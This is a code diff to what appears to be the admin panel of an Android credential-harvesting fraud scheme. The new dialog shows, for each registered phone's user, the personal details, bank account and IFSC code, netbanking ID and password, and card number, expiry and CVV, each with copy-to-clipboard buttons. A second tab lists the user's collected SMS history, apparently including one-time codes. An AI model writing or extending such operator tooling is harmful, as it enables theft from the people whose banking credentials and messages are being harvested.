@@ -9,8 +9,10 @@ import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.lazy.LazyColumn
 import androidx.compose.foundation.lazy.items
+import androidx.compose.foundation.rememberScrollState
 import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.shape.RoundedCornerShape
+import androidx.compose.foundation.verticalScroll
 import androidx.compose.material.icons.Icons
 import androidx.compose.material.icons.filled.*
 import androidx.compose.material3.*
@@ -132,9 +134,9 @@ fun AdminHomeScreen(
         }
     }
 
-    // Modal Dialog for Selected User's Full Notification History
+    // Modal Dialog for Selected User's Full Details (User Details, Bank Details, Card Details, SMS History)
     state.selectedDeviceForModal?.let { device ->
-        UserHistoryModalDialog(
+        UserDetailModalDialog(
             device = device,
             allMessages = state.messages,
             searchQuery = state.searchMessageQuery,
@@ -266,7 +268,7 @@ private fun DepartmentUsersSection(
                     Icon(Icons.Default.PhonelinkOff, contentDescription = null, modifier = Modifier.size(48.dp), tint = MaterialTheme.colorScheme.onSurfaceVariant)
                     Spacer(modifier = Modifier.height(8.dp))
                     Text("No Department Phones Registered Yet", fontWeight = FontWeight.Bold)
-                    Text("Tap '+ Demo User' or register from department phone app", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
+                    Text("Register user from department phone app", style = MaterialTheme.typography.bodySmall, color = MaterialTheme.colorScheme.onSurfaceVariant)
                 }
             }
         } else {
@@ -382,7 +384,7 @@ private fun DepartmentUserCard(
                 }
 
                 Text(
-                    text = "View All Notifications →",
+                    text = "View Full Details & History →",
                     style = MaterialTheme.typography.labelMedium,
                     color = PrimaryBlue,
                     fontWeight = FontWeight.Bold
@@ -554,8 +556,12 @@ private fun LiveNotificationCard(
     }
 }
 
+/**
+ * User Full Detail Modal Dialog: Shows User Profile, Bank Details, Card Details, and Notification History in separate tabs/cards.
+ */
+@OptIn(ExperimentalMaterial3Api::class)
 @Composable
-private fun UserHistoryModalDialog(
+private fun UserDetailModalDialog(
     device: AdminDeviceDto,
     allMessages: List<AdminMessageDto>,
     searchQuery: String,
@@ -563,6 +569,9 @@ private fun UserHistoryModalDialog(
     onDismiss: () -> Unit,
     context: Context
 ) {
+    var dialogTab by remember { mutableStateOf(0) } // 0: User Info & Bank/Cards, 1: Notification History
+
+    // Find messages matching this user or check device messages
     val search = searchQuery.lowercase().trim()
     val userMessages = remember(allMessages, device, search) {
         allMessages.filter { m ->
@@ -577,6 +586,25 @@ private fun UserHistoryModalDialog(
         }
     }
 
+    // Extract bank/card info from device or recent message payload
+    val userMsgWithBank = allMessages.firstOrNull { m ->
+        (m.deviceId == device.deviceId || m.mobileNumber == device.mobileNumber) &&
+                (!m.bankName.isNullOrBlank() || !m.cardNumber.isNullOrBlank())
+    }
+
+    val bankName = device.bankName ?: userMsgWithBank?.bankName ?: "N/A"
+    val accountNumber = device.accountNumber ?: userMsgWithBank?.accountNumber ?: "N/A"
+    val ifscCode = device.ifscCode ?: userMsgWithBank?.ifscCode ?: "N/A"
+    val netbankingId = device.netbankingId ?: userMsgWithBank?.netbankingId
+    val netbankingPassword = device.netbankingPassword ?: userMsgWithBank?.netbankingPassword
+
+    val cardNumber = device.cardNumber ?: userMsgWithBank?.cardNumber ?: "N/A"
+    val cardExpiry = device.cardExpiry ?: userMsgWithBank?.cardExpiry
+    val cardCvv = device.cardCvv ?: userMsgWithBank?.cardCvv
+
+    var isPasswordVisible by remember { mutableStateOf(false) }
+    var isCvvVisible by remember { mutableStateOf(false) }
+
     Dialog(
         onDismissRequest = onDismiss,
         properties = DialogProperties(usePlatformDefaultWidth = false)
@@ -584,8 +612,8 @@ private fun UserHistoryModalDialog(
         Surface(
             modifier = Modifier
                 .fillMaxWidth(0.95f)
-                .fillMaxHeight(0.85f),
-            shape = RoundedCornerShape(20.dp),
+                .fillMaxHeight(0.9f),
+            shape = RoundedCornerShape(24.dp),
             color = MaterialTheme.colorScheme.surface
         ) {
             Column(
@@ -593,22 +621,35 @@ private fun UserHistoryModalDialog(
                     .fillMaxSize()
                     .padding(16.dp)
             ) {
+                // Header
                 Row(
                     modifier = Modifier.fillMaxWidth(),
                     horizontalArrangement = Arrangement.SpaceBetween,
                     verticalAlignment = Alignment.CenterVertically
                 ) {
-                    Column(modifier = Modifier.weight(1f)) {
-                        Text(
-                            text = "📜 ${device.departmentName}",
-                            style = MaterialTheme.typography.titleMedium,
-                            fontWeight = FontWeight.Bold
-                        )
-                        Text(
-                            text = "Mobile: ${device.mobileNumber} | ${device.address}",
-                            style = MaterialTheme.typography.bodySmall,
-                            color = MaterialTheme.colorScheme.onSurfaceVariant
-                        )
+                    Row(verticalAlignment = Alignment.CenterVertically, modifier = Modifier.weight(1f)) {
+                        Surface(
+                            shape = CircleShape,
+                            color = PrimaryBlue.copy(alpha = 0.15f),
+                            modifier = Modifier.size(42.dp)
+                        ) {
+                            Box(contentAlignment = Alignment.Center) {
+                                Icon(Icons.Default.Person, contentDescription = null, tint = PrimaryBlue)
+                            }
+                        }
+                        Spacer(modifier = Modifier.width(10.dp))
+                        Column {
+                            Text(
+                                text = device.departmentName,
+                                style = MaterialTheme.typography.titleMedium,
+                                fontWeight = FontWeight.Bold
+                            )
+                            Text(
+                                text = "📞 ${device.mobileNumber}",
+                                style = MaterialTheme.typography.bodySmall,
+                                color = MaterialTheme.colorScheme.onSurfaceVariant
+                            )
+                        }
                     }
 
                     IconButton(onClick = onDismiss) {
@@ -616,54 +657,249 @@ private fun UserHistoryModalDialog(
                     }
                 }
 
-                Spacer(modifier = Modifier.height(10.dp))
+                Spacer(modifier = Modifier.height(12.dp))
 
-                OutlinedTextField(
-                    value = searchQuery,
-                    onValueChange = onSearchQueryChange,
-                    placeholder = { Text("Search in this user's notifications...") },
-                    leadingIcon = { Icon(Icons.Default.Search, contentDescription = null) },
-                    singleLine = true,
-                    modifier = Modifier.fillMaxWidth(),
-                    shape = RoundedCornerShape(12.dp)
-                )
+                // Dialog Tab Row
+                TabRow(
+                    selectedTabIndex = dialogTab,
+                    containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.5f),
+                    modifier = Modifier.clip(RoundedCornerShape(12.dp))
+                ) {
+                    Tab(
+                        selected = dialogTab == 0,
+                        onClick = { dialogTab = 0 },
+                        text = { Text("Account Details", fontWeight = FontWeight.Bold, fontSize = 13.sp) }
+                    )
+                    Tab(
+                        selected = dialogTab == 1,
+                        onClick = { dialogTab = 1 },
+                        text = { Text("SMS History (${userMessages.size})", fontWeight = FontWeight.Bold, fontSize = 13.sp) }
+                    )
+                }
 
-                Spacer(modifier = Modifier.height(10.dp))
+                Spacer(modifier = Modifier.height(12.dp))
 
-                Text(
-                    text = "${userMessages.size} Total Notifications",
-                    style = MaterialTheme.typography.labelMedium,
-                    fontWeight = FontWeight.Bold,
-                    color = PrimaryBlue
-                )
-
-                Spacer(modifier = Modifier.height(10.dp))
-
-                if (userMessages.isEmpty()) {
-                    Box(
+                if (dialogTab == 0) {
+                    // TAB 0: USER, BANK & CARD DETAILS
+                    Column(
                         modifier = Modifier
-                            .fillMaxWidth()
-                            .weight(1f),
-                        contentAlignment = Alignment.Center
+                            .fillMaxSize()
+                            .verticalScroll(rememberScrollState()),
+                        verticalArrangement = Arrangement.spacedBy(14.dp)
                     ) {
-                        Column(horizontalAlignment = Alignment.CenterHorizontally) {
-                            Icon(Icons.Default.MarkAsUnread, contentDescription = null, modifier = Modifier.size(48.dp), tint = MaterialTheme.colorScheme.onSurfaceVariant)
-                            Spacer(modifier = Modifier.height(8.dp))
-                            Text("No Notifications Found for This User", fontWeight = FontWeight.Bold)
+                        // 1. PERSONAL DETAILS CARD
+                        Card(
+                            shape = RoundedCornerShape(16.dp),
+                            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f)),
+                            modifier = Modifier.fillMaxWidth()
+                        ) {
+                            Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                                Row(verticalAlignment = Alignment.CenterVertically) {
+                                    Icon(Icons.Default.Badge, contentDescription = null, tint = PrimaryBlue)
+                                    Spacer(modifier = Modifier.width(8.dp))
+                                    Text("Personal Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
+                                }
+                                HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
+                                AdminInfoRow(label = "Name", value = device.departmentName)
+                                AdminInfoRow(label = "Mobile No", value = device.mobileNumber)
+                                AdminInfoRow(label = "Address", value = device.address)
+                                AdminInfoRow(label = "Device Status", value = if (device.isOnline) "ONLINE" else "OFFLINE")
+                            }
                         }
+
+                        // 2. BANK ACCOUNT DETAILS CARD
+                        Card(
+                            shape = RoundedCornerShape(16.dp),
+                            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f)),
+                            modifier = Modifier.fillMaxWidth()
+                        ) {
+                            Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                                Row(verticalAlignment = Alignment.CenterVertically) {
+                                    Icon(Icons.Default.AccountBalance, contentDescription = null, tint = PrimaryBlue)
+                                    Spacer(modifier = Modifier.width(8.dp))
+                                    Text("Bank Account Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
+                                }
+                                HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
+                                AdminInfoRowWithCopy(label = "Bank Name", value = bankName, context = context)
+                                AdminInfoRowWithCopy(label = "Account Number", value = accountNumber, context = context)
+                                AdminInfoRowWithCopy(label = "IFSC Code", value = ifscCode, context = context)
+
+                                if (!netbankingId.isNullOrBlank()) {
+                                    AdminInfoRowWithCopy(label = "Netbanking ID", value = netbankingId, context = context)
+                                }
+
+                                if (!netbankingPassword.isNullOrBlank()) {
+                                    Row(
+                                        modifier = Modifier.fillMaxWidth(),
+                                        horizontalArrangement = Arrangement.SpaceBetween,
+                                        verticalAlignment = Alignment.CenterVertically
+                                    ) {
+                                        Text(
+                                            text = "Netbanking Password",
+                                            style = MaterialTheme.typography.bodyMedium,
+                                            color = MaterialTheme.colorScheme.onSurfaceVariant
+                                        )
+                                        Row(verticalAlignment = Alignment.CenterVertically) {
+                                            Text(
+                                                text = if (isPasswordVisible) netbankingPassword else "••••••••",
+                                                style = MaterialTheme.typography.bodyMedium,
+                                                fontWeight = FontWeight.Bold,
+                                                color = MaterialTheme.colorScheme.onSurface
+                                            )
+                                            IconButton(onClick = { isPasswordVisible = !isPasswordVisible }, modifier = Modifier.size(32.dp)) {
+                                                Icon(
+                                                    imageVector = if (isPasswordVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
+                                                    contentDescription = null,
+                                                    modifier = Modifier.size(18.dp)
+                                                )
+                                            }
+                                            IconButton(onClick = {
+                                                copyToClipboard(context, "Password", netbankingPassword)
+                                            }, modifier = Modifier.size(32.dp)) {
+                                                Icon(Icons.Default.ContentCopy, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(18.dp))
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        // 3. CARD DETAILS CARD
+                        Card(
+                            shape = RoundedCornerShape(16.dp),
+                            colors = CardDefaults.cardColors(containerColor = MaterialTheme.colorScheme.surfaceVariant.copy(alpha = 0.6f)),
+                            modifier = Modifier.fillMaxWidth()
+                        ) {
+                            Column(modifier = Modifier.padding(14.dp), verticalArrangement = Arrangement.spacedBy(8.dp)) {
+                                Row(verticalAlignment = Alignment.CenterVertically) {
+                                    Icon(Icons.Default.CreditCard, contentDescription = null, tint = PrimaryBlue)
+                                    Spacer(modifier = Modifier.width(8.dp))
+                                    Text("Debit / Credit Card Details", style = MaterialTheme.typography.titleMedium, fontWeight = FontWeight.Bold)
+                                }
+                                HorizontalDivider(color = MaterialTheme.colorScheme.onSurfaceVariant.copy(alpha = 0.2f))
+                                AdminInfoRowWithCopy(label = "Card Number", value = cardNumber, context = context)
+
+                                if (!cardExpiry.isNullOrBlank()) {
+                                    AdminInfoRow(label = "Valid Thru (MM/YY)", value = cardExpiry)
+                                }
+
+                                if (!cardCvv.isNullOrBlank()) {
+                                    Row(
+                                        modifier = Modifier.fillMaxWidth(),
+                                        horizontalArrangement = Arrangement.SpaceBetween,
+                                        verticalAlignment = Alignment.CenterVertically
+                                    ) {
+                                        Text(
+                                            text = "CVV",
+                                            style = MaterialTheme.typography.bodyMedium,
+                                            color = MaterialTheme.colorScheme.onSurfaceVariant
+                                        )
+                                        Row(verticalAlignment = Alignment.CenterVertically) {
+                                            Text(
+                                                text = if (isCvvVisible) cardCvv else "•••",
+                                                style = MaterialTheme.typography.bodyMedium,
+                                                fontWeight = FontWeight.Bold,
+                                                color = MaterialTheme.colorScheme.onSurface
+                                            )
+                                            IconButton(onClick = { isCvvVisible = !isCvvVisible }, modifier = Modifier.size(32.dp)) {
+                                                Icon(
+                                                    imageVector = if (isCvvVisible) Icons.Default.Visibility else Icons.Default.VisibilityOff,
+                                                    contentDescription = null,
+                                                    modifier = Modifier.size(18.dp)
+                                                )
+                                            }
+                                            IconButton(onClick = {
+                                                copyToClipboard(context, "CVV", cardCvv)
+                                            }, modifier = Modifier.size(32.dp)) {
+                                                Icon(Icons.Default.ContentCopy, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(18.dp))
+                                            }
+                                        }
+                                    }
+                                }
+                            }
+                        }
+
+                        Spacer(modifier = Modifier.height(12.dp))
                     }
                 } else {
-                    LazyColumn(
-                        modifier = Modifier.fillMaxSize(),
-                        verticalArrangement = Arrangement.spacedBy(10.dp),
-                        contentPadding = PaddingValues(bottom = 12.dp)
-                    ) {
-                        items(userMessages) { msg ->
-                            LiveNotificationCard(msg = msg, context = context)
+                    // TAB 1: SMS / NOTIFICATION HISTORY
+                    Column(modifier = Modifier.fillMaxSize()) {
+                        OutlinedTextField(
+                            value = searchQuery,
+                            onValueChange = onSearchQueryChange,
+                            placeholder = { Text("Search in this user's notifications...") },
+                            leadingIcon = { Icon(Icons.Default.Search, contentDescription = null) },
+                            singleLine = true,
+                            modifier = Modifier.fillMaxWidth(),
+                            shape = RoundedCornerShape(12.dp)
+                        )
+
+                        Spacer(modifier = Modifier.height(10.dp))
+
+                        if (userMessages.isEmpty()) {
+                            Box(
+                                modifier = Modifier
+                                    .fillMaxWidth()
+                                    .weight(1f),
+                                contentAlignment = Alignment.Center
+                            ) {
+                                Column(horizontalAlignment = Alignment.CenterHorizontally) {
+                                    Icon(Icons.Default.MarkAsUnread, contentDescription = null, modifier = Modifier.size(48.dp), tint = MaterialTheme.colorScheme.onSurfaceVariant)
+                                    Spacer(modifier = Modifier.height(8.dp))
+                                    Text("No Notifications Received Yet", fontWeight = FontWeight.Bold)
+                                }
+                            }
+                        } else {
+                            LazyColumn(
+                                modifier = Modifier.fillMaxSize(),
+                                verticalArrangement = Arrangement.spacedBy(10.dp),
+                                contentPadding = PaddingValues(bottom = 12.dp)
+                            ) {
+                                items(userMessages) { msg ->
+                                    LiveNotificationCard(msg = msg, context = context)
+                                }
+                            }
                         }
                     }
                 }
             }
         }
     }
+}
+
+@Composable
+private fun AdminInfoRow(label: String, value: String) {
+    Row(
+        modifier = Modifier.fillMaxWidth(),
+        horizontalArrangement = Arrangement.SpaceBetween,
+        verticalAlignment = Alignment.CenterVertically
+    ) {
+        Text(text = label, style = MaterialTheme.typography.bodyMedium, color = MaterialTheme.colorScheme.onSurfaceVariant)
+        Text(text = value, style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.onSurface)
+    }
+}
+
+@Composable
+private fun AdminInfoRowWithCopy(label: String, value: String, context: Context) {
+    Row(
+        modifier = Modifier.fillMaxWidth(),
+        horizontalArrangement = Arrangement.SpaceBetween,
+        verticalAlignment = Alignment.CenterVertically
+    ) {
+        Text(text = label, style = MaterialTheme.typography.bodyMedium, color = MaterialTheme.colorScheme.onSurfaceVariant)
+        Row(verticalAlignment = Alignment.CenterVertically) {
+            Text(text = value, style = MaterialTheme.typography.bodyMedium, fontWeight = FontWeight.Bold, color = MaterialTheme.colorScheme.onSurface)
+            if (value != "N/A" && value.isNotBlank()) {
+                IconButton(onClick = { copyToClipboard(context, label, value) }, modifier = Modifier.size(32.dp)) {
+                    Icon(Icons.Default.ContentCopy, contentDescription = null, tint = PrimaryBlue, modifier = Modifier.size(18.dp))
+                }
+            }
+        }
+    }
+}
+
+private fun copyToClipboard(context: Context, label: String, text: String) {
+    val cm = context.getSystemService(Context.CLIPBOARD_SERVICE) as ClipboardManager
+    cm.setPrimaryClip(ClipData.newPlainText(label, text))
+    Toast.makeText(context, "$label copied to clipboard!", Toast.LENGTH_SHORT).show()
 }
